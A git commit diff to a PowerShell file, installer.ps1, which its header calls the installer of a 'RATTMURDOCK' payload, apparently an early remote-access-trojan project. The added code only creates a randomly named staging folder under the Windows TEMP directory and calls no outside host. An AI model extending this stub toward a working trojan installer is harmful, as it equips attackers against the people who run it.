b421cf4da45b9bfabeae0357fae78ae5011f82b1
Zeyad Mohamed <98295685+Zeyadm8112@users.noreply.github.com>
2024-06-04 07:01:16 +0300

    Update installer.ps1

--- installer.ps1
+++ installer.ps1
@@ -1,3 +1,28 @@
-# this is the file responsable for installing the payload
+# this RATTMURDOCK installer file
+# Created by : NinjaCat811
 
-Write-Output "this is an installer script"
+
+function Get-RandomString {
+    param (
+        [int]$length = 10  # Default length of the random string
+    )
+    # !@#$%^&*()-_=+[]{}|;:,.<>?
+    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+    $randomString = -join ((1..$length) | ForEach-Object { $characters[(Get-Random -Minimum 0 -Maximum $characters.Length)] })
+    return $randomString
+}
+
+# variables :   
+$wrdir = Get-RandomString -length 25
+$initial_path =  Get-Location
+$temp_folder = $env:TEMP
+$newFolderPath = Join-Path -Path $temp_folder -ChildPath $wrdir
+
+New-Item -Path $newFolderPath -ItemType Directory
+
+Write-Output "New folder created: $newFolderPath"
+
+
+
+
+
